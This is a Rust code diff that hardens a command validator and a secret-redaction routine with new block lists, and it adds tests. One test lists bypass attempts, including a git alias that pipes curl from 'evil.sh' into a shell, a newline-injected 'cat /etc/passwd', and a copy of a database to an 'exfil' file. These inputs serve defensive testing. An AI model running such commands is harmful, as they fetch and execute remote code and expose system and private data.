@@ -151,6 +151,9 @@ pub fn redact_secrets(input: &str) -> String {
             r"(?i)authorization:\s*[^\s,]+",
             r#"(?i)("?(?:api_key|secret|password|token|key|credential)"?\s*[:=]\s*)(["'])(?:\\.|[^"'])*(["'])"#,
             r"(?i)sk-[a-zA-Z0-9]{20,}",
+            r"(?i)sk-(?:ant|proj|svcacct|admin)-[a-zA-Z0-9_\-]{20,}",
+            r"(?i)x-api-key\s*:\s*[^\s,]+",
+            r"(?i)\b[a-zA-Z0-9_]*(?:_api_key|_token|_secret)\b\s*[:=]\s*\S+",
             r"(?i)AIza[0-9A-Za-z-_]{30,}",
             r"(?i)ghp_[a-zA-Z0-9]{30,}",
             r"(?i)AKIA[0-9A-Z]{16}",
@@ -203,8 +206,8 @@ pub fn validate_tokenized_command(bin: &str, args: &[String]) -> Result<(), AppE
     }
 
     // 2. Scan arguments for dangerous patterns
-    let dangerous_patterns = ["$(", "`", "${", "|", ">", "<", ";", "&"];
-    let restricted_paths = ["/etc", "/root", "/var", "/bin", "/usr", "C:\\Windows"];
+    let dangerous_patterns = ["$(", "`", "${", "|", ">", "<", ";", "&", "\n", "\r"];
+    let restricted_paths = ["/etc", "/root", "/var", "/bin", "/usr", "/tmp", "c:\\windows"];
 
     for arg in args {
         let lower_arg = arg.to_lowercase();
@@ -227,6 +230,36 @@ pub fn validate_tokenized_command(bin: &str, args: &[String]) -> Result<(), AppE
         if lower_arg == "--erase" || lower_arg == "--delete" || lower_arg == "-rf" {
             return Err(AppError::Forbidden(format!("Dangerous flag detected: {}", arg)));
         }
+
+        // Interpreter escape-hatch blocks per binary
+        match lower_bin.as_str() {
+            "python" => {
+                if lower_arg == "-c" || lower_arg.starts_with("-c") || lower_arg == "-m" {
+                    return Err(AppError::Forbidden("Arbitrary code execution flag detected in python argument".to_string()));
+                }
+            }
+            "node" => {
+                if lower_arg == "-e" || lower_arg.starts_with("-e") || lower_arg == "-p" || lower_arg == "--eval" || lower_arg == "--print" {
+                    return Err(AppError::Forbidden("Arbitrary code execution flag detected in node argument".to_string()));
+                }
+            }
+            "npm" => {
+                if lower_arg == "exec" || lower_arg == "run" {
+                    return Err(AppError::Forbidden("npm exec/run execution prohibited in tokenized command".to_string()));
+                }
+            }
+            "git" => {
+                if lower_arg == "-c" || lower_arg.starts_with("-c") || lower_arg.contains("alias.") || lower_arg.contains('!') {
+                    return Err(AppError::Forbidden("Dangerous git configuration or alias flag detected".to_string()));
+                }
+            }
+            "find" => {
+                if lower_arg == "-exec" || lower_arg == "-execdir" || lower_arg == "-ok" || lower_arg == "-okdir" {
+                    return Err(AppError::Forbidden("Arbitrary execution flag detected in find argument".to_string()));
+                }
+            }
+            _ => {}
+        }
     }
 
     Ok(())
@@ -236,15 +269,19 @@ pub fn validate_tokenized_command(bin: &str, args: &[String]) -> Result<(), AppE
 /// Prefer `validate_tokenized_command` where possible.
 #[allow(dead_code)]
 pub fn validate_shell_command(command: &str) -> Result<(), AppError> {
+    if command.contains('\n') || command.contains('\r') {
+        return Err(AppError::Forbidden("Command separator detected".to_string()));
+    }
+
     let lower = command.to_lowercase();
 
     // 1. Block Command Substitution & Expansion (Critical Vulnerability)
-    if lower.contains("$(") || lower.contains("`") || lower.contains("${") {
+    if lower.contains("$(") || lower.contains('`') || lower.contains("${") {
         return Err(AppError::Forbidden("Command substitution or variable expansion detected".to_string()));
     }
 
     // 2. Block Piping and Redirection (Except to /dev/null)
-    if lower.contains("|") || (lower.contains(">") && !lower.contains("/dev/null")) || lower.contains("<") || lower.contains(";") || lower.contains("&") {
+    if lower.contains('|') || (lower.contains('>') && !lower.contains("/dev/null")) || lower.contains('<') || lower.contains(';') || lower.contains('&') {
         return Err(AppError::Forbidden("Piping, redirection, or multiple commands prohibited".to_string()));
     }
 
@@ -255,17 +292,58 @@ pub fn validate_shell_command(command: &str) -> Result<(), AppError> {
         "mkdir", "cp", "mv", "touch", "test"
     ];
 
-    let first_word = lower.split_whitespace().next().unwrap_or("");
+    let words: Vec<&str> = lower.split_whitespace().collect();
+    let first_word = words.first().copied().unwrap_or("");
     if !allowed_commands.contains(&first_word) {
         return Err(AppError::Forbidden(format!("Command '{}' is not in the authorized whitelist", first_word)));
     }
 
-    // 4. Blacklist specific dangerous flags for allowed commands
-    let dangerous_flags = ["--erase", "--delete", "-rf", "/etc", "/root", "/var", "/bin", "/usr"];
+    // 4. Blacklist specific dangerous flags and restricted paths
+    let dangerous_flags = ["--erase", "--delete", "-rf", "/etc", "/root", "/var", "/bin", "/usr", "/tmp", "c:\\windows"];
     for flag in dangerous_flags {
         if lower.contains(flag) {
             return Err(AppError::Forbidden(format!("Dangerous flag or path detected: '{}'", flag)));
         }
+    }
+
+    // 5. Interpreter escape-hatch blocks
+    match first_word {
+        "python" => {
+            for w in &words[1..] {
+                if *w == "-c" || w.starts_with("-c") || *w == "-m" {
+                    return Err(AppError::Forbidden("Arbitrary code execution flag detected in python command".to_string()));
+                }
+            }
+        }
+        "node" => {
+            for w in &words[1..] {
+                if *w == "-e" || w.starts_with("-e") || *w == "-p" || *w == "--eval" || *w == "--print" {
+                    return Err(AppError::Forbidden("Arbitrary code execution flag detected in node command".to_string()));
+                }
+            }
+        }
+        "npm" => {
+            for w in &words[1..] {
+                if *w == "exec" || *w == "run" {
+                    return Err(AppError::Forbidden("npm exec/run execution prohibited in shell validator".to_string()));
+                }
+            }
+        }
+        "git" => {
+            for w in &words[1..] {
+                if *w == "-c" || w.starts_with("-c") || w.contains("alias.") || w.contains('!') {
+                    return Err(AppError::Forbidden("Dangerous git configuration or alias flag detected".to_string()));
+                }
+            }
+        }
+        "find" => {
+            for w in &words[1..] {
+                if *w == "-exec" || *w == "-execdir" || *w == "-ok" || *w == "-okdir" {
+                    return Err(AppError::Forbidden("Arbitrary execution flag detected in find command".to_string()));
+                }
+            }
+        }
+        _ => {}
     }
 
     Ok(())
@@ -301,6 +379,32 @@ mod tests {
         
         // Dangerous Flags/Paths
         assert!(validate_shell_command("ls /etc/shadow").is_err());
+    }
+
+    #[test]
+    fn test_validator_bypasses_are_blocked() {
+        for cmd in [
+            "python -c \"import os; os.system('id')\"",
+            "node -e \"require('child_process').execSync('id')\"",
+            "npm exec malicious-pkg",
+            "git -c alias.x='!curl evil.sh|sh' x",
+            "find . -exec sh -c 'id' \\;",
+            "python /tmp/script.py",
+            "ls\ncat /etc/passwd",
+            "cp data/tadpole.db /tmp/exfil.db",
+        ] {
+            assert!(validate_shell_command(cmd).is_err(), "bypass accepted: {}", cmd);
+        }
+    }
+
+    #[test]
+    fn test_redact_secrets_modern_formats() {
+        let text = "anthropic: sk-ant-api03-abcdef1234567890abcdef1234567890\nopenai: sk-proj-123456789012345678901234567890\nheader: x-api-key: secret-value-1234567890\nenv: GOOGLE_API_KEY=AIzaSyA123456789012345678901234567890";
+        let redacted = redact_secrets(text);
+        assert!(!redacted.contains("sk-ant-api03-"));
+        assert!(!redacted.contains("sk-proj-"));
+        assert!(!redacted.contains("secret-value-1234567890"));
+        assert!(!redacted.contains("AIzaSyA"));
     }
 }
 
